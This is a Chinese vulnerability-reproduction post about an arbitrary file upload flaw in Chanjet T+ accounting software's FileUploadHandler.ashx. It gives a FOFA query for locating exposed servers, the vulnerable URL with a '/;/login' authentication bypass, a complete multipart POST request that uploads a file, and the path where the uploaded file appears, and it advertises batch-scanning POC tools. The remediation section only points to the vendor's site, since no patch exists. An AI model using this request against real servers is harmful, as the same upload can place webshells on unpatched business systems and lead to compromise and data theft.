#  畅捷通TPlus FileUploadHandler.ashx存在任意文件上传漏洞 附POC   
2024-10-19更新  南风漏洞复现文库   2024-10-19 22:41  
  
免责声明：  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。  
该文章仅供学习用途使用。  
## 1. 畅捷通TPlus 简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
畅捷通T+专属云适用于需要一体化管理的企业，财务管理、业务管理、零售管理、生产管理、物流管理、移动仓管、营销管理、委外加工等人财货客一体化管理。  
## 2.漏洞描述  
  
畅捷通T+专属云适用于需要一体化管理的企业，财务管理、业务管理、零售管理、生产管理、物流管理、移动仓管、营销管理、委外加工等人财货客一体化管理。畅捷通TPlus FileUploadHandler.ashx存在任意文件上传漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
畅捷通T+  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3a7bRr2Rf7icTGhcI0xdhHcHoTyce57ZLp7FqVSgJyZ1bZOFKJBkdWl5SgJ28d9hS07JSNuC2xpS1A/640?wx_fmt=png&from=appmsg "null")  
  
畅捷通TPlus FileUploadHandler.ashx存在任意文件上传漏洞  
## 4.fofa查询语句  
  
app="畅捷通-TPlus"  
## 5.漏洞复现  
  
漏洞链接：https://xx.xx.xx.xx/tplus/SM/SetupAccount/FileUploadHandler.ashx/;/login  
  
漏洞数据包：  
```
POST /tplus/SM/SetupAccount/FileUploadHandler.ashx/;/login HTTP/1.1
Host: xx.xx.xx.xx
User-Agent:Mozilla/4.0(compatible; MSIE 8.0;Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept:*/*
Connection: close
Content-Length: 185
Content-Type: multipart/form-data; boundary=f2d64c4e8d84d6f13811577027e9b102

--f2d64c4e8d84d6f13811577027e9b102
Content-Disposition: form-data; name="file"; filename="135325.txt"
Content-Type:  image/jpeg

881455812769
--f2d64c4e8d84d6f13811577027e9b102--

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a7bRr2Rf7icTGhcI0xdhHcHvrlmdpllCp3gDDOiaQRAcRkgqCNlfdHmGrB3OiazXOAbMYMoMNB97SsQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
上传的文件路径：https://xx.xx.xx.xx/tplus/UserFiles/135325.txt  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a7bRr2Rf7icTGhcI0xdhHcHkuCGhicHXL2NjUqIjXqaiaom1aJdoOn9vjudn1qibPeeiaib08Ucg2icV2FA/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a7bRr2Rf7icTGhcI0xdhHcHiar7LwabqVGF1jOfgSKCWOBIPuNxLVdCoFzQtbHqbSRgVia5oiaqU25nQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3a7bRr2Rf7icTGhcI0xdhHcHHW28IQmhdSeReeHS1MJZ0DfzFo6FTvOpL8nM6mXkqg5Slr9iatjibiafw/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a7bRr2Rf7icTGhcI0xdhHcHc99bcYAt4PfmRuSqgEBsiaTYrQu2InxSaFunvibMb7rw24W0DjSTKUOA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a7bRr2Rf7icTGhcI0xdhHcHfGbLjfgPXAdUNtyKUhBamnleZBNodxA2APulN0Eo6XeERLkuJpMrVQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a7bRr2Rf7icTGhcI0xdhHcHAYoyTttyXmZjZ7pOIIopNlYo4dGSm66BRNKXhFJMXOKWPtY9LbPBfw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a7bRr2Rf7icTGhcI0xdhHcHotiaanF2pboDZUCUJeicUMVKjw0UuAnJt53b3sb62sbZ7RIQ40r4H2rw/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
目前厂商尚未提供相关漏洞补丁链接，请关注厂商主页及时更新：https://www.chanjet.com/  
## 8.往期回顾  
  
  
[Qualitor系统接口processVariavel.php存在命令执行漏洞CVE-2023-47253 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487574&idx=1&sn=0404a326308057b619f5a82aeb27ca45&chksm=974b9d51a03c144727c610bf847404829c26d5eb28f1a9a403927c9dcae7de7497e370701cee&scene=21#wechat_redirect)  
  
  
